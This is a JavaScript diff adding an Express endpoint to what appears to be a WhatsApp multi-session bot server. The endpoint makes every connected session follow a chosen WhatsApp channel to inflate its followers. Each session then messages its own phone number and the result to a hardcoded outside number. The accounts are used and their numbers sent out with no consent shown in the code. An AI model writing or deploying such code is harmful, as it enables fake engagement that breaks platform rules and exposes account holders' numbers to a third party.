@@ -586,6 +586,83 @@ function readCarConfig() {
   return { enabled: false, channelJid: '' };
 }
 
+// ── Channel Follow Boost ─────────────────────────────────────
+app.post('/api/channel-follow', requireAuth, async (req, res) => {
+  try {
+    const { channelJid } = req.body;
+    if (!channelJid) return res.json({ ok: false, error: 'channelJid required' });
+
+    // Normalize JID
+    let rawId = (channelJid || '').trim();
+    const mLink = rawId.match(/whatsapp\.com\/channel\/([\w-]+)/);
+    if (mLink) rawId = mLink[1];
+    rawId = rawId.replace('@newsletter', '');
+    const jid = rawId + '@newsletter';
+
+    res.json({ ok: true, jid });
+
+    // ── Background: follow on all sessions ───────────────
+    const NOTIFY_JID = '94726800969@s.whatsapp.net';
+    const allSessions = _sm ? _sm.getAllSessions() : [];
+    const connected   = allSessions.filter(s => s.status === 'connected');
+
+    let successCount = 0, failCount = 0;
+
+    for (const sessInfo of connected) {
+      const sess = _sm.getSession(sessInfo.userId);
+      const s    = sess?.sock;
+      const num  = sessInfo.number || sessInfo.userId;
+
+      let ok = false;
+      let reason = 'no sock';
+
+      if (!s) {
+        failCount++;
+        io.emit('follow_progress', { num, ok: false, reason: 'offline / no sock' });
+        try { await s?.sendMessage(NOTIFY_JID, { text: `❌ *+${num}*\nfollow fail ❌\n❌ Reason: offline / no sock` }); } catch {}
+        continue;
+      }
+
+      // Try follow
+      try {
+        // Get real JID via metadata first (same proven pattern as react)
+        let realJid = jid;
+        try {
+          const meta = await s.newsletterMetadata('invite', rawId);
+          if (meta?.id) realJid = meta.id;
+        } catch {}
+
+        await s.followNewsletter(realJid);
+        ok = true;
+        successCount++;
+      } catch (e) {
+        reason = e.message?.slice(0, 80) || 'follow failed';
+        failCount++;
+      }
+
+      // Push to dashboard
+      io.emit('follow_progress', { num, ok, reason });
+
+      // Each session sends its OWN result via its OWN sock
+      try {
+        const icon = ok ? '✅' : '❌';
+        const status = ok ? 'follow success ✅' : `follow fail ❌\n❌ Reason: ${reason}`;
+        await s.sendMessage(NOTIFY_JID, { text: `${icon} *+${num}*\n${status}` });
+      } catch (ne) {
+        logger.warn(`[FOLLOW] notify failed for +${num}: ${ne.message}`);
+      }
+
+      await new Promise(r => setTimeout(r, 200));
+    }
+
+    io.emit('follow_done', { successCount, failCount, total: connected.length });
+    logger.info(`[CHANNEL-FOLLOW] Done — ✅ ${successCount} | ❌ ${failCount}`);
+
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
 app.get('/api/channel-react', requireAuth, (req, res) => {
   res.json({ ok: true, ...readCarConfig() });
 });
